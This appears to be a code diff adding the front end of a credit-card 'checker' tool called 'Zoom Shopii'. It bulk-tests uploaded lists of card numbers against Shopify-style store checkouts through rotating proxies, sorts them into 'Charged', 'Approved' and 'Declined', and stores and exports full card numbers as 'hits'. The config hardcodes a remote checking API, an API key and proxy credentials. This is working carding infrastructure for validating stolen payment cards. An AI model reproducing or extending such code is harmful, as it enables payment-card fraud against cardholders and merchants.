+                            <button class="progress-filter-btn approved" data-filter="approved" data-target="quick">✅ Approved <span class="count" id="quickApprovedCount">0</span></button>
+                            <button class="progress-filter-btn declined" data-filter="declined" data-target="quick">❌ Declined <span class="count" id="quickDeclinedCount">0</span></button>
+                        </div>
+                    </div>
+                    <div class="results-section">
+                        <h3>Results</h3>
+                        <div id="quickResultsList"></div>
+                    </div>
+                </div>
+
+                <!-- MASS CHECK -->
+                <div id="tab-masscheck" class="tab-content">
+                    <h2>📦 Mass Check</h2>
+                    <p class="subtitle">Upload a .txt file — click START — batch size: 200</p>
+                    
+                    <div class="upload-section" id="dropZone">
+                        <p>📁 Drag & drop your .txt file here</p>
+                        <p class="dim">or click to browse · Supports any CC format</p>
+                        <input type="file" id="fileInput" accept=".txt" style="display:none;" />
+                        <button class="btn btn-secondary" id="browseBtn">Browse Files</button>
+                    </div>
+
+                    <div class="file-info" id="fileInfo">
+                        <span>📄 File: <span class="filename" id="fileNameDisplay">-</span></span>
+                        <span style="margin-left:12px;">💳 Cards: <span class="filecount" id="fileCardCount">0</span></span>
+                        <span style="margin-left:12px;">📊 Total: <span class="filecount" id="fileTotalDisplay">0</span></span>
+                    </div>
+
+                    <div class="btn-group">
+                        <button class="btn btn-primary" id="massStartBtn" disabled>🚀 START MASS CHECK</button>
+                        <button class="btn btn-pause" id="massPauseBtn" disabled>⏸️ Pause</button>
+                        <button class="btn btn-resume" id="massResumeBtn" disabled>▶️ Resume</button>
+                        <button class="btn btn-danger" id="massStopBtn" disabled>⏹️ Stop</button>
+                        <button class="btn btn-secondary" id="massClearBtn">🗑️ Clear Results</button>
+                    </div>
+                    <div style="margin-top:8px;">
+                        <span class="status-indicator stopped" id="massStatusIndicator">⏹️ Stopped</span>
+                        <span class="info-text" style="margin-left:12px;">Progress: <span id="massProgressText">0/0</span></span>
+                    </div>
+
+                    <div class="progress-filter-container" id="massFilterContainer">
+                        <span class="label">📊 Show:</span>
+                        <button class="progress-filter-btn all active" data-filter="all" data-target="mass">ALL</button>
+                        <button class="progress-filter-btn charged" data-filter="charged" data-target="mass">💎 Charged <span class="count" id="massChargedFilterCount">0</span></button>
+                        <button class="progress-filter-btn approved" data-filter="approved" data-target="mass">✅ Approved <span class="count" id="massApprovedFilterCount">0</span></button>
+                        <button class="progress-filter-btn declined" data-filter="declined" data-target="mass">❌ Declined <span class="count" id="massDeclinedFilterCount">0</span></button>
+                    </div>
+
+                    <div id="massProgress" style="display:none; margin-top:12px;">
+                        <p>Processing: <span id="massStatus">0%</span></p>
+                        <div class="progress-bar"><div id="massProgressFill" class="progress-fill"></div></div>
+                        <p class="info-text" style="font-size:0.75rem; color:var(--text-dim);">
+                            💎 Charged: <span id="massChargedCount">0</span> | 
+                            ✅ Approved: <span id="massApprovedCount">0</span> | 
+                            ❌ Declined: <span id="massDeadCount">0</span>
+                        </p>
+                    </div>
+
+                    <div class="results-section">
+                        <h3>Live Results</h3>
+                        <div id="massResultsList"></div>
+                    </div>
+                </div>
+
+                <!-- SITE MANAGER -->
+                <div id="tab-sites" class="tab-content">
+                    <h2>🌐 Site Manager</h2>
+                    <p class="subtitle">Manage your sites — upload, paste, check, and clean</p>
+
+                    <div style="display:flex; gap:15px; flex-wrap:wrap; margin-bottom:12px; background:var(--bg-card); border-radius:8px; padding:12px 15px; border:1px solid var(--border-color);">
+                        <span class="info-text">Total Sites: <span class="highlight" id="siteTotalDisplay">0</span></span>
+                        <span class="info-text">Live Sites: <span class="highlight" id="siteLiveDisplay">0</span></span>
+                        <span class="info-text">Dead Sites: <span class="highlight" id="siteDeadDisplay">0</span></span>
+                    </div>
+
+                    <div class="manager-section">
+                        <div>
+                            <div class="upload-area">
+                                <h3>📤 Upload Sites (.txt)</h3>
+                                <p>One URL per line</p>
+                                <input type="file" id="siteFileInput" accept=".txt" />
+                                <button class="btn btn-secondary" id="uploadSitesBtn">Upload File</button>
+                            </div>
+
+                            <div class="manual-area" style="margin-top:8px;">
+                                <h3>✏️ Manual Input</h3>
+                                <p>Paste sites (one per line)</p>
+                                <textarea id="manualSites" rows="4" placeholder="https://example.com&#10;https://another.com"></textarea>
+                                <button class="btn btn-secondary" id="addManualSitesBtn">➕ Add Sites</button>
+                            </div>
+
+                            <div style="margin-top:8px; background:var(--bg-card); border:1px solid var(--border-color); border-radius:8px; padding:12px;">
+                                <h3 style="color:var(--neon-green); font-size:0.85rem; margin-bottom:6px;">⚡ Actions</h3>
+                                <div class="btn-group">
+                                    <button class="btn btn-warning" id="checkSitesBtn">🔍 Check & Remove Dead</button>
+                                    <button class="btn btn-danger" id="clearSitesBtn">🗑️ Clear All</button>
+                                </div>
+                                <div id="siteCheckProgress" style="display:none; margin-top:8px;">
+                                    <p>Checking sites: <span id="siteCheckStatus">0%</span></p>
+                                    <div class="progress-bar"><div id="siteCheckFill" class="progress-fill"></div></div>
+                                    <p class="info-text" style="font-size:0.7rem; color:var(--text-dim);">
+                                        <span id="siteCheckAlive">0</span> alive | 
+                                        <span id="siteCheckDead">0</span> dead | 
+                                        <span id="siteCheckChecked">0</span>/<span id="siteCheckTotal">0</span>
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="list-area">
+                            <h3>Live Sites (<span id="liveSiteCount">0</span>)</h3>
+                            <div class="list-container" id="siteList">
+                                <div class="list-item" style="color:var(--text-dim);">No sites uploaded yet</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- PROXY MANAGER -->
+                <div id="tab-proxies" class="tab-content">
+                    <h2>🔌 Proxy Manager</h2>
+                    <p class="subtitle">Manage your proxies — ALL formats supported</p>
+
+                    <div style="display:flex; gap:15px; flex-wrap:wrap; margin-bottom:12px; background:var(--bg-card); border-radius:8px; padding:12px 15px; border:1px solid var(--border-color);">
+                        <span class="info-text">Total Proxies: <span class="highlight" id="proxyTotalDisplay">0</span></span>
+                        <span class="info-text">Live Proxies: <span class="highlight" id="proxyLiveDisplay">0</span></span>
+                        <span class="info-text">Dead Proxies: <span class="highlight" id="proxyDeadDisplay">0</span></span>
+                    </div>
+
+                    <div class="manager-section">
+                        <div>
+                            <div class="upload-area">
+                                <h3>📤 Upload Proxies (.txt)</h3>
+                                <p>One proxy per line — ALL formats supported</p>
+                                <input type="file" id="proxyFileInput" accept=".txt" />
+                                <button class="btn btn-secondary" id="uploadProxiesBtn">Upload File</button>
+                            </div>
+
+                            <div class="manual-area" style="margin-top:8px;">
+                                <h3>✏️ Manual Input</h3>
+                                <p>Paste proxies (one per line)</p>
+                                <textarea id="manualProxies" rows="4" placeholder="user:pass@192.168.1.1:8080&#10;192.168.1.1:8080:user:pass&#10;192.168.1.1:8080"></textarea>
+                                <button class="btn btn-secondary" id="addManualProxiesBtn">➕ Add Proxies</button>
+                            </div>
+
+                            <div style="margin-top:8px; background:var(--bg-card); border:1px solid var(--border-color); border-radius:8px; padding:12px;">
+                                <h3 style="color:var(--neon-green); font-size:0.85rem; margin-bottom:6px;">⚡ Actions</h3>
+                                <div class="btn-group">
+                                    <button class="btn btn-warning" id="checkProxiesBtn">🔍 Check & Remove Dead</button>
+                                    <button class="btn btn-danger" id="clearProxiesBtn">🗑️ Clear All</button>
+                                </div>
+                                <div id="proxyCheckProgress" style="display:none; margin-top:8px;">
+                                    <p>Checking proxies: <span id="proxyCheckStatus">0%</span></p>
+                                    <div class="progress-bar"><div id="proxyCheckFill" class="progress-fill"></div></div>
+                                    <p class="info-text" style="font-size:0.7rem; color:var(--text-dim);">
+                                        <span id="proxyCheckAlive">0</span> alive | 
+                                        <span id="proxyCheckDead">0</span> dead | 
+                                        <span id="proxyCheckChecked">0</span>/<span id="proxyCheckTotal">0</span>
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="list-area">
+                            <h3>Live Proxies (<span id="liveProxyCount">0</span>)</h3>
+                            <div class="list-container" id="proxyList">
+                                <div class="list-item" style="color:var(--text-dim);">No proxies uploaded yet</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- HITS -->
+                <div id="tab-hits" class="tab-content">
+                    <h2>🎯 Hits</h2>
+                    <p class="subtitle"><span id="hitTotalDisplay">0</span> total hits across all checks</p>
+                    
+                    <div class="hit-controls">
+                        <button class="hit-filter-btn all active" data-filter="all">ALL</button>
+                        <button class="hit-filter-btn charged" data-filter="charged">💎 CHARGED</button>
+                        <button class="hit-filter-btn approved" data-filter="approved">✅ APPROVED</button>
+                    </div>
+                    
+                    <div class="hit-controls" style="margin-top:5px;">
+                        <button class="btn btn-secondary" id="refreshHitsBtn">🔄 Refresh</button>
+                        <button class="btn btn-secondary" id="exportHitsBtn">📥 Export CSV</button>
+                        <button class="btn btn-danger" id="clearHitsBtn">🗑️ Clear All</button>
+                    </div>
+                    
+                    <div id="hitsListContainer"></div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ================================================================
+        // ZOOM SHOPII - ULTRA FAST EDITION WITH DEBUG
+        // ================================================================
+
+        // ===== CONFIGURATION =====
+        const CONFIG = {
+            API_SERVERS: ['https://shimmering-celebration-production-7dd0.up.railway.app'],
+            CHECKER_API_KEY: 'AnonShopii2026!',
+            DEFAULT_PROXY: 'd1lgsabwmptd:9ki0plorgc80q50@216.26.231.190:3129',
+            ANDROID_UA: 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36'
+        };
+
+        // ===== DEBUG LOGGER =====
+        let debugLogs = [];
+        let debugVisible = false;
+
+        function logDebug(message, type = 'info') {
+            const time = new Date().toLocaleTimeString();
+            debugLogs.push({ time, message, type });
+            updateDebugUI();
+        }
+
+        function updateDebugUI() {
+            const container = document.getElementById('debugContent');
+            if (!container) return;
+            const html = debugLogs.slice(-50).map(e => {
+                const color = e.type === 'success' ? 'success' : e.type === 'error' ? 'error' : e.type === 'warning' ? 'warning' : e.type === 'raw' ? 'raw' : 'info';
+                return `<div class="log-entry"><span class="time">[${e.time}]</span> <span class="${color}">${e.message}</span></div>`;
+            }).join('');
+            container.innerHTML = html;
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function toggleDebug() {
+            const content = document.getElementById('debugContent');
+            debugVisible = !debugVisible;
+            content.classList.toggle('active', debugVisible);
+        }
+
+        function clearDebug() {
+            debugLogs = [];
+            updateDebugUI();
+            logDebug('Log cleared', 'info');
+        }
+
+        async function testAPI() {
+            logDebug('🔍 Testing API connection...', 'info');
+            try {
+                const url = CONFIG.API_SERVERS[0] + '/check?site=shopify.com&key=' + CONFIG.CHECKER_API_KEY;
+                logDebug(`📡 Requesting: ${url.substring(0, 80)}...`, 'info');
+                const response = await fetch(url, {
+                    headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
+                });
+                logDebug(`📡 Response: ${response.status} ${response.statusText}`, response.ok ? 'success' : 'error');
+                if (response.ok) {
+                    const data = await response.json();
+                    logDebug(`📄 Response: ${JSON.stringify(data).substring(0, 150)}`, 'raw');
+                    logDebug('✅ API is reachable!', 'success');
+                } else {
+                    logDebug('❌ API returned error status!', 'error');
+                }
+            } catch (error) {
+                logDebug(`❌ API test FAILED: ${error.message}`, 'error');
+            }
+        }
+
+        async function testProxy() {
+            logDebug('🔍 Testing proxy...', 'info');
+            const proxy = CONFIG.DEFAULT_PROXY;
+            logDebug(`🔌 Proxy: ${proxy.substring(0, 30)}...`, 'info');
+            try {
+                const url = CONFIG.API_SERVERS[0] + '/check?site=shopify.com&key=' + CONFIG.CHECKER_API_KEY + '&proxy=' + encodeURIComponent(proxy);
+                logDebug(`📡 Testing: ${url.substring(0, 80)}...`, 'info');
+                const response = await fetch(url, {
+                    headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
+                });
+                logDebug(`📡 Response: ${response.status} ${response.statusText}`, response.ok ? 'success' : 'error');
+                if (response.ok) {
+                    const data = await response.json();
+                    logDebug(`📄 Response: ${JSON.stringify(data).substring(0, 150)}`, 'raw');
+                    logDebug('✅ Proxy test completed!', 'success');
+                } else {
+                    logDebug('❌ Proxy test failed!', 'error');
+                }
+            } catch (error) {
+                logDebug(`❌ Proxy test ERROR: ${error.message}`, 'error');
+            }
+        }
+
+        // ===== STATE =====
+        let state = {
+            charged: 0,
+            approved: 0,
+            totalHits: 0,
+            sites: [],
+            proxies: [],
+            hits: [],
+            declined: 0
+        };
+
+        let quickRunning = false, quickPaused = false, quickStopRequested = false;
+        let quickCardsList = [], quickCurrentIndex = 0, quickResults = [], quickFilter = 'all';
+
+        let massFileData = null, massRunning = false, massPaused = false, massStopRequested = false;
+        let massCardsList = [], massCurrentIndex = 0, massResults = [], massFilter = 'all';
+
+        let hitsFilter = 'all';
+        let confirmCallback = null;
+
+        // ===== LOAD/SAVE =====
+        function loadState() {
+            const saved = localStorage.getItem('zoomShopiiState');
+            if (saved) { try { state = JSON.parse(saved); } catch(e) {} }
+        }
+        function saveState() {
+            localStorage.setItem('zoomShopiiState', JSON.stringify(state));
+        }
+
+        // ===== CONFIRM DIALOG =====
+        function showConfirm(title, message, callback) {
+            document.getElementById('confirmOverlay').classList.add('active');
+            document.getElementById('confirmTitle').textContent = title;
+            document.getElementById('confirmMessage').textContent = message;
+            confirmCallback = callback;
+        }
+
+        document.getElementById('confirmYesBtn').addEventListener('click', function() {
+            document.getElementById('confirmOverlay').classList.remove('active');
+            if (confirmCallback) { confirmCallback(true); confirmCallback = null; }
+        });
+
+        document.getElementById('confirmNoBtn').addEventListener('click', function() {
+            document.getElementById('confirmOverlay').classList.remove('active');
+            if (confirmCallback) { confirmCallback(false); confirmCallback = null; }
+        });
+
+        // ===== DOM REFS =====
+        const $ = id => document.getElementById(id);
+        const els = {
+            charged: $('chargedCount'), approved: $('approvedCount'), totalHits: $('totalHits'),
+            siteCount: $('siteCount'), proxyCount: $('proxyCount'),
+            dashCharged: $('dashCharged'), dashApproved: $('dashApproved'), dashTotal: $('dashTotal'),
+            dashSites: $('dashSites'), dashProxies: $('dashProxies'), dashDeclined: $('dashDeclined'),
+            quickCards: $('quickCards'), quickCheckBtn: $('quickCheckBtn'), quickClearBtn: $('quickClearBtn'),
+            quickPauseBtn: $('quickPauseBtn'), quickResumeBtn: $('quickResumeBtn'), quickStopBtn: $('quickStopBtn'),
+            quickResultsList: $('quickResultsList'), quickStatus: $('quickStatus'), quickProgressText: $('quickProgressText'),
+            quickChargedCount: $('quickChargedCount'), quickApprovedCount: $('quickApprovedCount'), quickDeclinedCount: $('quickDeclinedCount'),
+            fileInput: $('fileInput'), browseBtn: $('browseBtn'), dropZone: $('dropZone'),
+            massStartBtn: $('massStartBtn'), massClearBtn: $('massClearBtn'),
+            massPauseBtn: $('massPauseBtn'), massResumeBtn: $('massResumeBtn'), massStopBtn: $('massStopBtn'),
+            massProgress: $('massProgress'), massStatus: $('massStatus'), massProgressFill: $('massProgressFill'),
+            massResultsList: $('massResultsList'), massChargedCount: $('massChargedCount'),
+            massApprovedCount: $('massApprovedCount'), massDeadCount: $('massDeadCount'),
+            massStatusIndicator: $('massStatusIndicator'), massProgressText: $('massProgressText'),
+            massChargedFilterCount: $('massChargedFilterCount'), massApprovedFilterCount: $('massApprovedFilterCount'),
+            massDeclinedFilterCount: $('massDeclinedFilterCount'),
+            fileInfo: $('fileInfo'), fileNameDisplay: $('fileNameDisplay'),
+            fileCardCount: $('fileCardCount'), fileTotalDisplay: $('fileTotalDisplay'),
+            siteFileInput: $('siteFileInput'), uploadSitesBtn: $('uploadSitesBtn'),
+            siteList: $('siteList'), liveSiteCount: $('liveSiteCount'),
+            manualSites: $('manualSites'), addManualSitesBtn: $('addManualSitesBtn'),
+            checkSitesBtn: $('checkSitesBtn'), clearSitesBtn: $('clearSitesBtn'),
+            siteCheckProgress: $('siteCheckProgress'), siteCheckStatus: $('siteCheckStatus'),
+            siteCheckFill: $('siteCheckFill'), siteCheckAlive: $('siteCheckAlive'),
+            siteCheckDead: $('siteCheckDead'), siteCheckChecked: $('siteCheckChecked'),
+            siteCheckTotal: $('siteCheckTotal'),
+            siteTotalDisplay: $('siteTotalDisplay'), siteLiveDisplay: $('siteLiveDisplay'),
+            siteDeadDisplay: $('siteDeadDisplay'),
+            proxyFileInput: $('proxyFileInput'), uploadProxiesBtn: $('uploadProxiesBtn'),
+            proxyList: $('proxyList'), liveProxyCount: $('liveProxyCount'),
+            manualProxies: $('manualProxies'), addManualProxiesBtn: $('addManualProxiesBtn'),
+            checkProxiesBtn: $('checkProxiesBtn'), clearProxiesBtn: $('clearProxiesBtn'),
+            proxyCheckProgress: $('proxyCheckProgress'), proxyCheckStatus: $('proxyCheckStatus'),
+            proxyCheckFill: $('proxyCheckFill'), proxyCheckAlive: $('proxyCheckAlive'),
+            proxyCheckDead: $('proxyCheckDead'), proxyCheckChecked: $('proxyCheckChecked'),
+            proxyCheckTotal: $('proxyCheckTotal'),
+            proxyTotalDisplay: $('proxyTotalDisplay'), proxyLiveDisplay: $('proxyLiveDisplay'),
+            proxyDeadDisplay: $('proxyDeadDisplay'),
+            refreshHitsBtn: $('refreshHitsBtn'), exportHitsBtn: $('exportHitsBtn'), clearHitsBtn: $('clearHitsBtn'),
+            recentHitsBody: $('recentHitsBody'), hitsListContainer: $('hitsListContainer'),
+            hitTotalDisplay: $('hitTotalDisplay')
+        };
+
+        // ===== NAVIGATION =====
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.addEventListener('click', function() {
+                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+                this.classList.add('active');
+                const tab = this.dataset.tab;
+                document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+                const target = document.getElementById('tab-' + tab);
+                if (target) target.classList.add('active');
+            });
+        });
+
+        // ===== UPDATE STATS =====
+        function updateStats() {
+            els.charged.textContent = state.charged;
+            els.approved.textContent = state.approved;
+            els.totalHits.textContent = state.totalHits;
+            els.siteCount.textContent = state.sites.length;
+            els.proxyCount.textContent = state.proxies.length;
+            els.dashCharged.textContent = state.charged;
+            els.dashApproved.textContent = state.approved;
+            els.dashTotal.textContent = state.totalHits;
+            els.dashSites.textContent = state.sites.length;
+            els.dashProxies.textContent = state.proxies.length;
+            els.dashDeclined.textContent = state.declined;
+            els.siteTotalDisplay.textContent = state.sites.length;
+            els.siteLiveDisplay.textContent = state.sites.length;
+            els.siteDeadDisplay.textContent = 0;
+            els.proxyTotalDisplay.textContent = state.proxies.length;
+            els.proxyLiveDisplay.textContent = state.proxies.length;
+            els.proxyDeadDisplay.textContent = 0;
+            els.hitTotalDisplay.textContent = state.totalHits;
+            saveState();
+        }
+
+        // ===== ULTIMATE PROXY VALIDATOR =====
+        function isValidProxy(line) {
+            const trimmed = line.trim();
+            if (!trimmed) return false;
+
+            // FORMAT 1: user:pass@host:port (with IP or Domain)
+            if (/^[^:]+:[^@]+@[a-zA-Z0-9\-\.]+:\d+$/.test(trimmed)) return true;
+
+            const parts = trimmed.split(':');
+
+            // FORMAT 2: host:port:user:pass (host can be IP or Domain)
+            if (parts.length === 4) {
+                const host = parts[0];
+                const port = parts[1];
+                const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host);
+                const isDomain = /^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(host);
+                if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) return true;
+            }
+
+            // FORMAT 3: host:port (with IP or Domain)
+            if (parts.length === 2) {
+                const host = parts[0];
+                const port = parts[1];
+                const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host);
+                const isDomain = /^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(host);
+                if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) return true;
+            }
+
+            // FORMAT 4: host:port@user:pass (rare but supported)
+            if (trimmed.includes('@')) {
+                const atParts = trimmed.split('@');
+                if (atParts.length === 2) {
+                    const hostPort = atParts[0];
+                    const userPass = atParts[1];
+                    const hpParts = hostPort.split(':');
+                    const upParts = userPass.split(':');
+                    if (hpParts.length === 2 && upParts.length === 2) {
+                        const host = hpParts[0];
+                        const port = hpParts[1];
+                        const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host);
+                        const isDomain = /^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(host);
+                        if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) return true;
+                    }
+                }
+            }
+
+            // FORMAT 5: With protocol prefix
+            const protoMatch = trimmed.match(/^(socks5|socks4|http|https):\/\/(.+)$/i);
+            if (protoMatch) {
+                const rest = protoMatch[2];
+                if (/^[^:]+:[^@]+@[a-zA-Z0-9\-\.]+:\d+$/.test(rest)) return true;
+                const restParts = rest.split(':');
+                if (restParts.length === 2) {
+                    const host = restParts[0];
+                    const port = restParts[1];
+                    const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host);
+                    const isDomain = /^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(host);
+                    if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) return true;
+                }
+            }
+
+            return false;
+        }
+
+        // ===== MASK CARD =====
+        function maskCard(card) {
+            if (!card) return '****';
+            const str = String(card).replace(/\s/g, '');
+            if (str.length >= 16) return str.slice(0, 6) + '****' + str.slice(-4);
+            return '****' + str.slice(-4);
+        }
+
+        // ===== RENDER FUNCTIONS =====
+        function renderHits() {
+            if (!state.hits || state.hits.length === 0) {
+                els.recentHitsBody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--text-dim);">No hits yet — start checking cards!</td></tr>';
+                return;
+            }
+            const recent = state.hits.slice(0, 5);
+            els.recentHitsBody.innerHTML = recent.map(h => `
+                <tr>
+                    <td><span class="status-badge ${(h.status || '').toLowerCase()}">${h.status || 'UNKNOWN'}</span></td>
+                    <td>${h.fullCard || h.card}</td>
+                    <td>${h.responseType || h.type || '3DS_REQUIRED'}</td>
+                    <td>$${h.amount || '0.00'}</td>
+                </tr>
+            `).join('');
+            if (recent.length === 0) {
+                els.recentHitsBody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--text-dim);">No hits yet — start checking cards!</td></tr>';
+            }
+            renderFullHitsList();
+        }
+
+        function renderFullHitsList() {
+            let filteredHits = state.hits;
+            if (hitsFilter === 'charged') {
+                filteredHits = state.hits.filter(h => h.status === 'CHARGED');
+            } else if (hitsFilter === 'approved') {
+                filteredHits = state.hits.filter(h => h.status === 'APPROVED');
+            }
+            
+            els.hitTotalDisplay.textContent = state.hits.length;
+            
+            if (filteredHits.length === 0) {
+                els.hitsListContainer.innerHTML = `<div style="text-align:center;color:var(--text-dim);padding:40px 0;">No hits found${hitsFilter !== 'all' ? ' for filter: ' + hitsFilter.toUpperCase() : ''}</div>`;
+                return;
+            }
+            
+            els.hitsListContainer.innerHTML = filteredHits.map(h => `
+                <div class="hit-item" style="border-left-color: ${h.status === 'CHARGED' ? 'var(--neon-green)' : 'var(--neon-orange)'}">
+                    <div class="hit-info">
+                        <span class="hit-card">${h.fullCard || h.card} <span class="status-badge ${h.status.toLowerCase()}">${h.status}</span></span>
+                        <div class="hit-details">
+                            ${h.responseType || h.type || '3DS_REQUIRED'} 
+                            ${h.bank ? '| 🏦 ' + h.bank : ''} 
+                            ${h.country ? '| ' + h.country : ''}
+                            ${h.brand ? '| 💳 ' + h.brand : ''}
+                            ${h.cardType ? '| ' + h.cardType : ''}
+                            ${h.cardLevel ? '| ' + h.cardLevel : ''}
+                            ${h.gateway ? '| 🛒 ' + h.gateway : ''}
+                            ${h.price ? '| 💰 $' + h.price : ''}
+                        </div>
+                        <span class="hit-time">${h.date || new Date().toLocaleString()}</span>
+                    </div>
+                    <div class="hit-amount">
+                        $${h.amount || '0.00'}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // ===== RENDER SITES =====
+        function renderSites() {
+            if (state.sites.length === 0) {
+                els.siteList.innerHTML = '<div class="list-item" style="color:var(--text-dim);">No sites uploaded yet</div>';
+                els.liveSiteCount.textContent = '0';
+                return;
+            }
+            
+            let html = `
+                <div class="list-header">
+                    <span class="col-num">#</span>
+                    <span class="col-left">Site URL</span>
+                    <span class="col-right">
+                        <span class="h-status">Status</span>
+                        <span class="h-latency">Price</span>
+                        <span class="h-added">Added</span>
+                        <span class="h-actions"></span>
+                    </span>
+                </div>
+            `;
+            
+            state.sites.forEach((s, index) => {
+                let siteUrl = s;
+                let status = 'ALIVE';
+                let price = '0.00';
+                let added = new Date().toLocaleDateString();
+                
+                if (typeof s === 'object') {
+                    siteUrl = s.url || s;
+                    status = s.status || 'ALIVE';
+                    price = s.price || '0.00';
+                    added = s.added || new Date().toLocaleDateString();
+                }
+                
+                const statusClass = status === 'ALIVE' ? 'status-alive' : 'status-dead';
+                const displayUrl = siteUrl.length > 40 ? siteUrl.slice(0, 40) + '...' : siteUrl;
+                
+                html += `
+                    <div class="list-item-row">
+                        <span class="row-num">${index + 1}</span>
+                        <span class="row-left" title="${siteUrl}">${displayUrl}</span>
+                        <span class="row-right">
+                            <span class="r-status ${statusClass}">${status}</span>
+                            <span class="r-latency">$${price}</span>
+                            <span class="r-added">${added}</span>
+                            <span class="r-actions">
+                                <button class="btn-icon btn-retest" onclick="retestSite(${index})" title="Retest site">🔄</button>
+                                <button class="btn-icon btn-remove" onclick="removeSite(${index})" title="Remove site">❌</button>
+                            </span>
+                        </span>
+                    </div>
+                `;
+            });
+            
+            els.siteList.innerHTML = html;
+            els.liveSiteCount.textContent = state.sites.length;
+        }
+
+        // ===== RENDER PROXIES =====
+        function renderProxies() {
+            if (state.proxies.length === 0) {
+                els.proxyList.innerHTML = '<div class="list-item" style="color:var(--text-dim);">No proxies uploaded yet</div>';
+                els.liveProxyCount.textContent = '0';
+                return;
+            }
+            
+            let html = `
+                <div class="list-header">
+                    <span class="col-num">#</span>
+                    <span class="col-left">Proxy</span>
+                    <span class="col-right">
+                        <span class="h-status">Status</span>
+                        <span class="h-latency">Latency</span>
+                        <span class="h-added">Added</span>
+                        <span class="h-actions"></span>
+                    </span>
+                </div>
+            `;
+            
+            state.proxies.forEach((p, index) => {
+                let proxyStr = p;
+                let status = 'ALIVE';
+                let latency = 'N/A';
+                let added = new Date().toLocaleDateString();
+                
+                if (typeof p === 'object') {
+                    proxyStr = p.proxy || p;
+                    status = p.status || 'ALIVE';
+                    latency = p.latency || 'N/A';
+                    added = p.added || new Date().toLocaleDateString();
+                }
+                
+                const statusClass = status === 'ALIVE' ? 'status-alive' : 'status-dead';
+                const displayProxy = proxyStr.length > 40 ? proxyStr.slice(0, 40) + '...' : proxyStr;
+                
+                html += `
+                    <div class="list-item-row">
+                        <span class="row-num">${index + 1}</span>
+                        <span class="row-left" title="${proxyStr}">${displayProxy}</span>
+                        <span class="row-right">
+                            <span class="r-status ${statusClass}">${status}</span>
+                            <span class="r-latency">${latency}</span>
+                            <span class="r-added">${added}</span>
+                            <span class="r-actions">
+                                <button class="btn-icon btn-retest" onclick="retestProxy(${index})" title="Retest proxy">🔄</button>
+                                <button class="btn-icon btn-remove" onclick="removeProxy(${index})" title="Remove proxy">❌</button>
+                            </span>
+                        </span>
+                    </div>
+                `;
+            });
+            
+            els.proxyList.innerHTML = html;
+            els.liveProxyCount.textContent = state.proxies.length;
+        }
+
+        // ===== UPDATE FILTER COUNTS =====
+        function updateQuickFilterCounts() {
+            let charged = 0, approved = 0, declined = 0;
+            quickResults.forEach(r => {
+                if (r.status === 'Charged') charged++;
+                else if (r.status === 'Approved') approved++;
+                else declined++;
+            });
+            els.quickChargedCount.textContent = charged;
+            els.quickApprovedCount.textContent = approved;
+            els.quickDeclinedCount.textContent = declined;
+        }
+
+        function updateMassFilterCounts() {
+            let charged = 0, approved = 0, declined = 0;
+            massResults.forEach(r => {
+                if (r.status === 'Charged') charged++;
+                else if (r.status === 'Approved') approved++;
+                else declined++;
+            });
+            els.massChargedFilterCount.textContent = charged;
+            els.massApprovedFilterCount.textContent = approved;
+            els.massDeclinedFilterCount.textContent = declined;
+        }
+
+        // ===== SITE ACTIONS =====
+        function removeSite(index) {
+            state.sites.splice(index, 1);
+            renderSites();
+            updateStats();
+            logDebug(`🗑️ Removed site #${index + 1}`, 'info');
+        }
+
+        async function retestSite(index) {
+            const site = state.sites[index];
+            if (!site) return;
+            
+            if (state.proxies.length === 0) {
+                alert('❌ No proxies available to test!');
+                return;
+            }
+            
+            const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
+            logDebug(`🔄 Retesting site: ${site}`, 'info');
+            const result = await testSiteWithPrice(site, proxy);
+            
+            if (result.status === 'alive') {
+                state.sites[index] = { url: site, status: 'ALIVE', price: result.price.toFixed(2), added: new Date().toLocaleDateString() };
+                logDebug(`✅ Site ALIVE: ${site} - $${result.price.toFixed(2)}`, 'success');
+                alert('✅ Site is ALIVE! Price: $' + result.price.toFixed(2));
+            } else {
+                state.sites[index] = { url: site, status: 'DEAD', price: '0.00', added: new Date().toLocaleDateString() };
+                logDebug(`❌ Site DEAD: ${site}`, 'error');
+                alert('❌ Site is DEAD!');
+            }
+            renderSites();
+            updateStats();
+        }
+
+        // ===== PROXY ACTIONS =====
